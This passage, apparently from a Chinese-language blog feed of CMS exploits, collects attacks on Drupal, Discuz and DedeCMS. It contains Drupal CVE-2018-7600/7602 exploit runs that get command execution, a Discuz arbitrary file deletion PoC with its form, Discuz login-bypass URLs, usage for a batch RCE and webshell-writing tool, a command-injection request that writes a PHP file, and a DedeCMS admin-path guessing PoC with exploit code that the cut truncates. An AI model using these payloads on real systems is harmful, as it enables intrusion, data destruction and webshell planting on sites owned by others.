class="line">&gt; + VER: Drupal 6.x                                                      +</span><br><span class="line">&gt; +      Drupal 7.x &lt; 7.58                                               +</span><br><span class="line">&gt; +      Drupal 8.3 &lt; 8.3.9                                              +</span><br><span class="line">&gt; +      Drupal 8.4 &lt; 8.4.6                                              +</span><br><span class="line">&gt; +      Drupal 8.5 &lt; 8.5.1                                              +</span><br><span class="line">&gt; +----------------------------------------------------------------------+</span><br><span class="line">&gt; + DES: Shell仅能回显一行代码，多行代码结果查看http://xxxx/exphub.txt   +</span><br><span class="line">&gt; +----------------------------------------------------------------------+</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; zhzy@debian:$ python3 cve-2018-7600_cmd.py http://freeerror.org:8080</span><br><span class="line">&gt; [+] http://freeerror.org:8080/exphub.txt</span><br><span class="line">&gt; </span><br><span class="line">&gt; Shell &gt;&gt;&gt; id</span><br><span class="line">&gt; uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">&gt; Shell &gt;&gt;&gt; whoami</span><br><span class="line">&gt; www-data</span><br><span class="line">&gt; Shell &gt;&gt;&gt; exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="CVE-2018-7600-poc-py-该脚本可检测-CVE-2018-7602-和-CVE-2018-7600"><a href="#CVE-2018-7600-poc-py-该脚本可检测-CVE-2018-7602-和-CVE-2018-7600" class="headerlink" title="CVE-2018-7600_poc.py    该脚本可检测 CVE-2018-7602 和 CVE-2018-7600"></a>CVE-2018-7600_poc.py    该脚本可检测 CVE-2018-7602 和 CVE-2018-7600</h2><blockquote><p>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt; zhzy@debian:$ python3 cve-2018-7600_poc.py http://freeerror.org:8081</span><br><span class="line">&gt; </span><br><span class="line">&gt; +------------------------------------------------------------------+</span><br><span class="line">&gt; +                           iDrupal                                +</span><br><span class="line">&gt; +                          by IAmG0d                               +</span><br><span class="line">&gt; +------------------------------------------------------------------+</span><br><span class="line">&gt; + USE: python3 &lt;filename&gt; &lt;url&gt;                                    +</span><br><span class="line">&gt; + EXP: python3 cve-2018-7602_poc.py http://freeerror.org:8081      +</span><br><span class="line">&gt; +------------------------------------------------------------------+</span><br><span class="line">&gt; + DES: 该脚本可检测 CVE-2018-7602 和 CVE-2018-7600                 +</span><br><span class="line">&gt; +------------------------------------------------------------------+</span><br><span class="line">&gt; </span><br><span class="line">&gt; [~] Checking the version of http://freeerror.org:8081/</span><br><span class="line">&gt; [+] Possibly vulnerable to CVE-2018-7600!</span><br><span class="line">&gt; [+] Possibly vulnerable to CVE-2018-7602!</span><br><span class="line">&gt; [0:)] Thank You For Using... Goodbye</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="CVE-2018-7602-cmd-py-Drupal-内核远程代码执行漏洞利用脚本-需要账户密码"><a href="#CVE-2018-7602-cmd-py-Drupal-内核远程代码执行漏洞利用脚本-需要账户密码" class="headerlink" title="CVE-2018-7602_cmd.py    Drupal 内核远程代码执行漏洞利用脚本(需要账户密码)"></a>CVE-2018-7602_cmd.py    Drupal 内核远程代码执行漏洞利用脚本(需要账户密码)</h2><blockquote><p>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt; zhzy@debian:/debian/archives-tool/web-drupal$ python cve-2018-7602_cmd.py admin admin http://freeerror.org:8080 -c id</span><br><span class="line">&gt; ()</span><br><span class="line">&gt; +---------------------------------------------------------------------------------+</span><br><span class="line">&gt; +   DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     +</span><br><span class="line">&gt; +                                   by pimps                                      +</span><br><span class="line">&gt; +---------------------------------------------------------------------------------+</span><br><span class="line">&gt; + USE: python3 &lt;filename&gt; &lt;username&gt; &lt;password&gt; &lt;url&gt; -c &lt;command&gt;                +</span><br><span class="line">&gt; + EXP: python3 cve-2018-7602_cmd.py admin admin http://1.1.1.1:8080 -c &quot;id&quot;       +</span><br><span class="line">&gt; + VER: Drupal 7.x &lt; 7.59                                                          +</span><br><span class="line">&gt; +      Drupal 8.4 &lt; 8.4.8                                                         +</span><br><span class="line">&gt; +      Drupal 8.5 &lt; 8.5.3                                                         +</span><br><span class="line">&gt; +---------------------------------------------------------------------------------+</span><br><span class="line">&gt; + DES: CVE-2018-7602 Need Username Password                                       +</span><br><span class="line">&gt; +---------------------------------------------------------------------------------+</span><br><span class="line">&gt; </span><br><span class="line">&gt; [*] Creating a session using the provided credential...</span><br><span class="line">&gt; [*] Finding User ID...</span><br><span class="line">&gt; [*] User ID found: /user/1</span><br><span class="line">&gt; [*] Poisoning a form using &apos;destination&apos; and including it in cache.</span><br><span class="line">&gt; [*] Poisoned form ID: form-6iAq8Ou5pKFQqEZ4sh1A_zQI_5QMSC71Stp4ohaseW0</span><br><span class="line">&gt; [*] Triggering exploit to execute: id</span><br><span class="line">&gt; uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz_%EF%BC%9C3.4_birthprovince_%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz_%EF%BC%9C3.4_birthprovince_%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="Discuz-＜3-4-birthprovince-前台任意文件删除"><a href="#Discuz-＜3-4-birthprovince-前台任意文件删除" class="headerlink" title="Discuz_＜3.4_birthprovince_前台任意文件删除"></a>Discuz_＜3.4_birthprovince_前台任意文件删除</h1><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>Discuz &lt; 3.4 版本</p><p>需要会员身份登陆站点。</p><p>下载地址： 链接: <a href="https://pan.baidu.com/s/1hsOoSte" target="_blank" rel="noopener">https://pan.baidu.com/s/1hsOoSte</a> 密码: nvjj</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>测试：</p><ol><li>为了不破坏原有程序，在根目录下新建 1.txt 作为演示。</li></ol><p><img src="Discuz_＜3.4_birthprovince_前台任意文件删除/1.PNG" alt="1"></p><ol start="2"><li>登陆前台，访问 <a href="http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&amp;ac=profile&amp;op=base" target="_blank" rel="noopener">http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&amp;ac=profile&amp;op=base</a></li></ol><p>先发起一个POST请求 </p><pre><code>birthprovince=../../../1.txt&amp;profilesubmit=1&amp;formhash=18a19dce// formhash 需要右键查看源代码得到</code></pre><p>成功后，个人信息已经被修改成如下:</p><p><img src="Discuz_＜3.4_birthprovince_前台任意文件删除/changed.PNG" alt="changed"></p><ol start="3"><li>最后，本地提交POST表单删除文件 1.txt</li></ol><p>表单内容：</p><pre><code>&lt;form action=&quot;http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&amp;ac=profile&amp;op=base&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;file&quot; name=&quot;birthprovince&quot; id=&quot;file&quot; /&gt;&lt;input type=&quot;text&quot; name=&quot;formhash&quot; value=&quot;18a19dce&quot;/&gt;&lt;/p&gt;&lt;input type=&quot;text&quot; name=&quot;profilesubmit&quot; value=&quot;1&quot;/&gt;&lt;/p&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/from&gt;</code></pre><p>随便上传一个图片提交会导致删除 birthprovince 设置的文件名称，在这里是 1.txt。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="http://www.freebuf.com/vuls/149904.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/149904.html</a></li><li><a href="http://www.freebuf.com/articles/system/149810.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/149810.html</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz3.4%E8%B6%8A%E6%9D%83%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz3.4%E8%B6%8A%E6%9D%83%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>由于DZ 3.4默认安装了，攻击者可以利用该漏洞越权登陆。</p><blockquote><p>通过/plugin.php?id=wechat:wechat&amp;ac=wxregister&amp;username={name}这种方式可以使openid为空， 但注册的是一个新的账号。</p></blockquote><blockquote><p>解除指定uid绑定的微信：</p><p>/plugin.php?id=wechat:wechat&amp;ac=unbindmp&amp;uid={uid}&amp;hash={formhash}</p></blockquote><blockquote><p>登陆第一个openid为空的账号：/plugin.php?id=wechat:wechat&amp;ac=wxregister</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/</url>
      
        <content type="html"><![CDATA[<h1 id="dz-ml-rce-py-：discuz-ml-RCE-漏洞检测工具"><a href="#dz-ml-rce-py-：discuz-ml-RCE-漏洞检测工具" class="headerlink" title="dz-ml-rce.py ：discuz ml RCE 漏洞检测工具"></a>dz-ml-rce.py ：discuz ml RCE 漏洞检测工具</h1><hr><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><br><br>漏洞在于cookie的language可控并且没有严格过滤，导致可以远程代码执行，详情参考</p><p><a href="http://www.lsablog.com/networksec/penetration/discuz-ml-rce-analysis/" target="_blank" rel="noopener">discuz ml RCE漏洞重现及分析</a></p><p><br><br>本工具支持单url和批量检测，有判断模式（只判断有无该漏洞）、cmdshell模式（返回简单的cmd shell）和getshell模式（写入一句话木马）。</p><hr><h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p><br><br>python2.7<br><br>pip -r requirements.txt<br><br><br></p><p><strong>使用时加上漏洞PHP页面（如forum.php,portal.php），直接写域名可能会重定向导致误报!</strong></p><hr><h1 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h1><p><br><br>使用帮助<br><br>python dz-ml-rce.py -h<br></p><p><img src="discuz-ml-rce/demo/dzmlrce06.png" alt></p><p><br><br>判断模式<br><br>python dz-ml-rce.py -u “<a href="http://www.xxx.cn/forum.php&quot;" target="_blank" rel="noopener">http://www.xxx.cn/forum.php&quot;</a> <br></p><p><img src="discuz-ml-rce/demo/dzmlrce02.png" alt></p><p><br><br>cmdshell模式<br><br>python dz-ml-rce.py -u “<a href="http://www.xxx.cn/forum.php&quot;" target="_blank" rel="noopener">http://www.xxx.cn/forum.php&quot;</a> –cmdshell<br></p><p><img src="discuz-ml-rce/demo/dzmlrce03.png" alt></p><p><br><br>getshell模式<br><br>python dz-ml-rce.py -u “<a href="http://www.xxx.cn/forum.php&quot;" target="_blank" rel="noopener">http://www.xxx.cn/forum.php&quot;</a> –getshell<br></p><p><img src="discuz-ml-rce/demo/dzmlrce04.png" alt></p><p><br><br>批量检测<br><br>python dz-ml-rce.py -f urls.txt<br></p><p><img src="discuz-ml-rce/demo/dzmlrce01.png" alt></p><p><br><br>批量getshell<br><br>python dz-ml-rce.py -f urls.txt –getshell<br></p><p><img src="discuz-ml-rce/demo/dzmlrce09.png" alt></p><hr><p># </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz!%201.5-2.5%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz!%201.5-2.5%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Discuz-1-5-2-5-命令执行漏洞"><a href="#Discuz-1-5-2-5-命令执行漏洞" class="headerlink" title="Discuz! 1.5-2.5 命令执行漏洞"></a>Discuz! 1.5-2.5 命令执行漏洞</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p> <strong>Discuz! 1.5-2.5</strong></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>需要登入后台。</p><p><img src="Discuz! 1.5-2.5 命令执行漏洞/1.png" alt="1"><br><img src="Discuz! 1.5-2.5 命令执行漏洞/2.png" alt="2"></p><p>修改的参数</p><p>参数<code>customtables[]</code></p><pre><code>customtables%5B%5D=pre_common_admincp_cmenu&quot;&gt;aaa; echo &apos;&lt;?php phpinfo(); ?&gt;&apos; &gt; phpinfo.php #</code></pre><p>数据包</p><pre><code>POST /discuz25/admin.php?action=db&amp;operation=export&amp;setup=1 HTTP/1.1Host: localhostContent-Length: 252Cache-Control: max-age=0Origin: http://localhostUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://localhost/discuz25/admin.php?action=db&amp;operation=exportAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: _ga=GA1.1.994534325.1530166127; PHPSESSID=ffe1069f199ac7656303b61e42db4f5d; ECSCP_ID=e685eee56d5dc4a732b0b1ecb8cbac6becac2355; ECS_ID=b9e7920dfb02c84b5298d0022c64a8fc393376d7; Phpstorm-326452dc=558db1bc-7f7b-4670-8d36-9cef7d8c1b9d; ECS[visit_times]=8; 3Od_visitedfid=2; 3Od_auth=03d3WSoYgxBuC4Yg3mqq4yEVgLBDsrbNx%2F8rIcURpRI5sDFtpC1S9F%2BYa6BViyFggZYM7bac7evIAZJdgLOJ7Q; 3Od_sid=mm4AMQ; QoOR_2132_saltkey=V6AnRzmw; QoOR_2132_lastvisit=1545183584; QoOR_2132_widthauto=-1; R94S_2132_saltkey=1hs56u42; R94S_2132_lastvisit=1545220172; R94S_2132_promotion=1; R94S_2132_auth=75696lGYV1FEogy00DO%2FmyhWbxk8OljAPZAeSvxfgwvvLbMruyS2sfVSYZUG4wr3GYw5L66%2FfppgB9gzioss; R94S_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; R94S_2132_creditbase=0D0D1D0D0D0D0D0D0; R94S_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; R94S_2132_ulastactivity=e0adnKO8pY2qUt5XPBdVc3jbgQxCrCiAkAFzNuN%2Fu9wTbgHc7XLK; R94S_2132_sid=9H4E8j; R94S_2132_lastact=1545224711%09admin.php%09; QoOR_2132_sid=BdGwL9; QoOR_2132_sendmail=1; QoOR_2132_ulastactivity=9cf4%2B3XCcfF1uHee0LOFG0wa6FFvCc1Rp96Kg%2BkgOi%2FL7ovDRKru; QoOR_2132_auth=32d7SwpKowF2VAeqfqe0dWo1FjINHjZA9zt%2ByF8A7LOif0pFSaHnEznijiCaqgsQD8NSBtEiwEDL4Wrnx1gz; QoOR_2132_checkpatch=1; QoOR_2132_checkupgrade=1; QoOR_2132_lastact=1545224853%09admin.php%09Connection: closeformhash=0d2eaac0&amp;scrolltop=&amp;anchor=&amp;type=custom&amp;customtables%5B%5D=pre_common_admincp_cmenu&quot;&gt;aaa; echo &apos;&lt;?php phpinfo(); ?&gt;&apos; &gt; phpinfo.php #&amp;method=shell&amp;extendins=0&amp;sqlcompat=&amp;usehex=1&amp;usezip=0&amp;filename=181219_u0CC19kJ&amp;exportsubmit=%E6%8F%90%E4%BA%A4</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://paper.seebug.org/763/" target="_blank" rel="noopener">https://paper.seebug.org/763/</a></p><p><a href="https://github.com/FoolMitAh/CVE-2018-14729" target="_blank" rel="noopener">https://github.com/FoolMitAh/CVE-2018-14729</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><ul><li>仅针对windows系统</li></ul><h3 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h3><p>首先看核心文件common.inc.php 大概148行左右</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_FILES)</span><br><span class="line">&#123;</span><br><span class="line">    require_once(DEDEINC.&apos;/uploadsafe.inc.php&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>uploadsafe.inc.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">if( preg_match(&apos;#^(cfg_|GLOBALS)#&apos;, $_key) )</span><br><span class="line">&#123;</span><br><span class="line">    exit(&apos;Request var not allow for uploadsafe!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$$_key = $_FILES[$_key][&apos;tmp_name&apos;]; //获取temp_name </span><br><span class="line">$&#123;$_key.&apos;_name&apos;&#125; = $_FILES[$_key][&apos;name&apos;];</span><br><span class="line">$&#123;$_key.&apos;_type&apos;&#125; = $_FILES[$_key][&apos;type&apos;] = preg_replace(&apos;#[^0-9a-z\./]#i&apos;, &apos;&apos;, $_FILES[$_key][&apos;type&apos;]);</span><br><span class="line">$&#123;$_key.&apos;_size&apos;&#125; = $_FILES[$_key][&apos;size&apos;] = preg_replace(&apos;#[^0-9]#&apos;,&apos;&apos;,$_FILES[$_key][&apos;size&apos;]);</span><br><span class="line">if(!empty($&#123;$_key.&apos;_name&apos;&#125;) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,$&#123;$_key.&apos;_name&apos;&#125;) || !preg_match(&quot;#\.#&quot;, $&#123;$_key.&apos;_name&apos;&#125;)) )</span><br><span class="line">&#123;</span><br><span class="line">    if(!defined(&apos;DEDEADMIN&apos;))</span><br><span class="line">    &#123;</span><br><span class="line">        exit(&apos;Not Admin Upload filetype not allow !&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(empty($&#123;$_key.&apos;_size&apos;&#125;))</span><br><span class="line">&#123;</span><br><span class="line">    $&#123;$_key.&apos;_size&apos;&#125; = @filesize($$_key);</span><br><span class="line">&#125;</span><br><span class="line">$imtypes = array</span><br><span class="line">(</span><br><span class="line">    &quot;image/pjpeg&quot;, &quot;image/jpeg&quot;, &quot;image/gif&quot;, &quot;image/png&quot;, </span><br><span class="line">    &quot;image/xpng&quot;, &quot;image/wbmp&quot;, &quot;image/bmp&quot;</span><br><span class="line">);</span><br><span class="line">if(in_array(strtolower(trim($&#123;$_key.&apos;_type&apos;&#125;)), $imtypes))</span><br><span class="line">&#123;</span><br><span class="line">    $image_dd = @getimagesize($$_key); </span><br><span class="line">    //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。</span><br><span class="line">    if (!is_array($image_dd))</span><br><span class="line">    &#123;</span><br><span class="line">        exit(&apos;Upload filetype not allow !&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>注意<code>$$_key</code>这一句，变量<code>$key</code>取自于<code>$_FILE</code>，由于<code>$_FILE</code>可控自然<code>$key</code>也可控,此处理论上是可以覆盖任意变量，但是前面有个正则判断不能出现<code>cfg_|GLOBALS</code>。(但是应该还可以覆盖其他变量此处感觉还可以深挖)</p><p>本人出发点是找个可以利用<code>&lt;&lt;</code>通配符猜解后台目录，所以只要<code>$$_key</code>参数可控就可以达到目的。</p><p>修正一处笔误。<br> <del>但在这之前有个<code>if(!defined(&#39;DEDEADMIN&#39;))</code>的判断,这个很好绕过设置<code>tmp_name为0或者1.jpg含.</code> 就可以绕过。</del></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($&#123;$_key.&apos;_name&apos;&#125;) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,$&#123;$_key.&apos;_name&apos;&#125;) || !preg_match(&quot;#\.#&quot;, $&#123;$_key.&apos;_name&apos;&#125;)) )</span><br><span class="line">    &#123;   </span><br><span class="line">        if(!defined(&apos;DEDEADMIN&apos;))</span><br><span class="line">        &#123;</span><br><span class="line">            exit(&apos;Not Admin Upload filetype not allow !&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    这个判断只需要设置$&#123;$_key.&apos;_name&apos;&#125; 的值为0或者1.jpg 含点“ . ” 既可以绕过 如：_FILES[b4dboy][name]=1.jpg</span><br></pre></td></tr></table></figure><p>最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了。</p><p>当目录文件存在的时候 返回正常页面。当不存在的时候返回：Upload filetype not allow !</p><h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><p>文字不好表达，便于理解。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// ./dedecms/favicon.ico</span><br><span class="line">if(@getimagesize($_GET[&apos;poc&apos;]))&#123;</span><br><span class="line">    echo 1;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    echo 0;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">get:</span><br><span class="line">http://localhost/test.php?poc=./d&lt;/favicon.ico</span><br><span class="line">返回：1</span><br><span class="line"></span><br><span class="line">http://localhost/test.php?poc=./a&lt;/favicon.ico</span><br><span class="line">返回：0</span><br><span class="line"></span><br><span class="line">http://localhost/test.php?poc=./de&lt;/favicon.ico</span><br><span class="line">返回：1</span><br><span class="line"></span><br><span class="line">http://localhost/test.php?poc=./ded&lt;/favicon.ico</span><br><span class="line">返回：1</span><br><span class="line"></span><br><span class="line">........</span><br></pre></td></tr></table></figure><h3 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dedecms/tags.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line"></span><br><span class="line">dopost=save&amp;_FILES[b4dboy][tmp_name]=./de&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif</span><br></pre></td></tr></table></figure><p>Common.inc.php 是被全局包含的文件，只要文件php文件包含了Common.inc.php都可以进行测试，以tags.php文件为例</p><p>当目录存在点时候： 图1</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180123000649-4080b60c-ff8e-1.png" target="_blank" rel="noopener"><img src="DedeCms后台地址泄露漏洞/20180123000649-4080b60c-ff8e-1.png" alt="img"></a><br> 当目录不存在点时候： 图2<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20180123000533-133714d4-ff8e-1.png" target="_blank" rel="noopener"><img src="DedeCms后台地址泄露漏洞/20180123000533-133714d4-ff8e-1.png" alt="img"></a></p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$domain=&apos;http://localhost/dedecms/&apos;;</span><br><span class="line">$url=$domain.&apos;/index.php&apos;;</span><br><span class="line">function post($url, $data, $cookie = &apos;&apos;) &#123;</span><br><span class="line">    $options = array(</span><br><span class="line">        CURLOPT_RETURNTRANSFER =&gt; true,</span><br><span class="line">        CURLOPT_HEADER =&gt; true,</span><br><span class="line">        CURLOPT_POST =&gt; true,</span><br><span class="line">        CURLOPT_SSL_VERIFYHOST =&gt; false,</span><br><span class="line">        CURLOPT_SSL_VERIFYHOST =&gt; false,</span><br><span class="line">        CURLOPT_COOKIE =&gt; $cookie,</span><br><span class="line">        CURLOPT_POSTFIELDS =&gt; $data,</span><br><span class="line">    );</span><br><span class="line">    $ch = curl_init($url);</span><br><span class="line">    curl_setopt_array($ch, $options);</span><br><span class="line">    $result = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line">$testlen=25;</span><br><span 